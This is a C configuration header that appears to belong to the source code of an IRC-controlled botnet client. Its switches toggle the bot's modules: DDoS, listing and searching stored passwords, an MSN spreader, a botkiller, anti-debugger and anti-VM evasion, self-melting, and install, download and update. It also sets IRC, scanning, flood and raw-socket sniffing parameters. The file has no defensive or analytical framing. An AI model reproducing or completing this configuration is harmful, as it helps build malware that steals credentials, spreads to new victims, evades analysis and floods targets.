#define DEBUG


////////////////////////////////////////////////////////////////////////////////////////
//====================================================================================//
////////////////////////////////////////////////////////////////////////////////////////

//////////////
// Commands //
//////////////
//#define NO_LOGOUT_CMD	// Logout command
//#define NO_REMOVE_CMD	// Remove command
//#define NO_FAKE_CMDS	// Fake commands

//////////////
// Bot Base //
//////////////
//#define NO_PING_REPLY	// Ping Reply
//#define NO_FLUSHDNS	// Flush DNS before connecting
#define NO_INSTALL	// Don't install the bot (registry etc..)
//#define NO_MELT		// Melting bot file
#define NO_ICON			// Adding an icon to file (Config/icon.ico)

/////////////
// Modules //
/////////////
#define NO_ANTIDEBUG	// AntiDebugger (SYSTEM DEBUGGER + PROCESS DEBUGGER)
#define NO_ANTIVM		// AntiVM		(VMWare + VPC + Anubis)
//#define NO_DDOS		// DDoS
//#define NO_PSTORE		// PStore (List + Search)
//#define NO_VISIT		// Visit (Connecting and asking the page)
//#define NO_UPDATE		// Update
//#define NO_DOWNLOAD	// Download / Update
//#define NO_IMSPREAD	// MSN Spreader (MSG + File)
//#define NO_BOTKILLER	// Botkiller


////////////////////////////////////////////////////////////////////////////////////////
//====================================================================================//
////////////////////////////////////////////////////////////////////////////////////////
#define PING_TIMEOUT	200	// If the bot hasnt recieved anything in this amount
							// of time it will quit and reconnect (s)
#define IRCLINE			514

#define MAX_TOKENS		64
#define MAX_LOGINS		3
#define MAX_THREADS		512

#define MAX_IP			16
#define MAX_HOSTNAME	256
#define MAX_NICKLEN		18
#define REQ_NICKLEN		7
#define REQ_IDENTLEN	6
#define REQ_REALNLEN	22

#define MAX_SCANDELAY	60
#define MIN_SCANDELAY	3

#define MAX_SCANTHRD	256
#define MAX_SCANTIME	9999

#define MAX_KEY_LENGTH	255
#define MAX_VALUE_NAME	16383

#define NICK_TYPE		N_MINE
#define IDENT_TYPE		N_OS
#define REALN_TYPE		N_BOX

#define FLOOD_DELAY		2000	// Send flood delay (ms)
#define SFLOOD_DELAY	7000	// Reconnect flood delay (ms)
#define RUPTIME_DELAY	600000	// Record uptime check delay (ms)
#define SECURE_DELAY	600000	// Secure thread loop delay (ms)

#define AMPM(x) ((x>12)?("PM"):("AM"))
#define HOUR(x) ((x>12)?(x-12):(x))

#ifndef SIO_RCVALL
#define SIO_RCVALL			_WSAIOW(IOC_VENDOR,1)
#endif
